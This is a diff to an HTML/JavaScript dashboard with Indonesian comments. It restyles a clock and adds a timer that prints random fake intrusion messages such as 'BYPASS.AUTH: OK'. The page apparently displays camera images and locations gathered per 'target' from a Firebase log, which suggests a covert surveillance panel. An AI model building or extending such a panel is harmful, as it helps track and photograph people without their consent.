@@ -29,6 +29,15 @@
             padding: 3px;
             font-family: 'Courier New', Courier, monospace;
         }
+        /* Perbaikan Tampilan Jam agar tidak mepet */
+        .clock-box {
+            text-align: right;
+            font-size: 11px;
+            line-height: 1.4;
+            background: #000;
+            border: 1px solid #00ff66;
+            padding: 2px 6px;
+        }
         .main-layout {
             display: grid;
             grid-template-columns: 1.2fr 1fr;
@@ -52,7 +61,6 @@
             display: flex;
             flex-direction: column;
         }
-        /* Membuat kotak peta kiri memenuhi ruang ke bawah secara otomatis */
         .box-container.full-height {
             flex-grow: 1;
         }
@@ -62,7 +70,6 @@
             margin-bottom: 4px;
             text-transform: uppercase;
         }
-        /* Peta utama mengisi penuh sisa tinggi kontainer */
         #mainMap {
             width: 100%;
             flex-grow: 1;
@@ -128,13 +135,13 @@
                 <option value="">-- Pilih Perangkat --</option>
             </select>
         </div>
-        <div id="clockDisplay">00:00:00 - 0/0/0000</div>
+        <div class="clock-box" id="clockDisplay">00:00:00<br>0/0/0000</div>
     </div>
 
     <!-- Main Layout -->
     <div class="main-layout">
         
-        <!-- Kolom Kiri: Peta Utama (Memenuhi ke bawah) -->
+        <!-- Kolom Kiri: Peta Utama -->
         <div class="left-panel">
             <div class="box-container full-height">
                 <a id="gmapsLink" href="#" target="_blank" class="btn-maps">Buka di Maps ↗</a>
@@ -166,9 +173,7 @@
             <div class="box-container">
                 <div class="box-title">MATRIX_STREAM</div>
                 <div class="matrix-box" id="matrixStream">
-                    > [10.00.00] SYS_ALLOC: 0x1F8F5F8F8<br>
-                    > [10.00.00] CONNECT: TCP_INTRUSION<br>
-                    > [10.00.01] BYPASS.AUTH: OK<br>
+                    > [SYSTEM] Matrix stream initialized...<br>
                 </div>
             </div>
 
@@ -212,15 +217,33 @@
             terminalLog.scrollTop = terminalLog.scrollHeight;
         }
 
-        // Jam Real-time
+        // Jam Real-time dengan format rapi (tidak mepet)
         setInterval(() => {
             const now = new Date();
             const timeStr = now.toTimeString().split(' ')[0];
             const dateStr = now.toLocaleDateString();
-            document.getElementById('clockDisplay').innerText = `${timeStr} - ${dateStr}`;
+            document.getElementById('clockDisplay').innerHTML = `${timeStr}<br>${dateStr}`;
         }, 1000);
 
-        // 1. Ambil Log Kamera Masuk & Petakan berdasarkan Target ID
+        // Efek Matrix Stream berjalan otomatis terus-menerus
+        const matrixLogs = [
+            "SYS_ALLOC: 0x1F8F5F8F8",
+            "CONNECT: TCP_INTRUSION",
+            "BYPASS.AUTH: OK",
+            "INJECT_PAYLOAD: SUCCESS",
+            "PACKET_SYNC: SECURE",
+            "LISTENING_PORT: 443 [ACTIVE]",
+            "GPS_POLL: RELAY_OK"
+        ];
+        
+        setInterval(() => {
+            const randomLog = matrixLogs[Math.floor(Math.random() * matrixLogs.length)];
+            const timeNow = new Date().toTimeString().split(' ')[0];
+            matrixStream.innerHTML += `> [${timeNow}] ${randomLog}<br>`;
+            matrixStream.scrollTop = matrixStream.scrollHeight;
+        }, 2500);
+
+        // 1. Ambil Log Kamera Masuk
         db.ref("camera_logs").limitToLast(30).on("child_added", (snapshot) => {
             const data = snapshot.val();
             if (data && data.targetId) {
@@ -229,7 +252,7 @@
                 }
                 targetImages[data.targetId][data.cameraType] = data.image;
 
-                matrixStream.innerHTML += `> [${new Date().toTimeString().split(' ')[0]}] INJECT_PAYLOAD: SUCCESS [${data.cameraType}]<br>`;
+                matrixStream.innerHTML += `> [${new Date().toTimeString().split(' ')[0]}] CAM_SYNC: ${data.cameraType} RECEIVED<br>`;
                 matrixStream.scrollTop = matrixStream.scrollHeight;
 
                 if (data.targetId === selectedTargetId) {
